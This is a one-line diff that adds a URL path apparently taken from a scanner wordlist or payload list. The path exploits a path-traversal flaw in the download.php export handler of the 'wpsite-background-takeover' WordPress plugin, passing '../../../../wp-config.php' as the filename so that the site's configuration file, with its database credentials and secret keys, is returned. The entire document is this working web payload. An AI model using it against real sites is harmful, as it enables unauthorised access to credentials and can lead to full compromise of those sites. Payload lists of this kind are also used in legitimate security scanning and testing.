@@ -1,0 +1,1 @@
+/wp-content/plugins/wpsite-background-takeover/exports/download.php?filename=../../../../wp-config.php
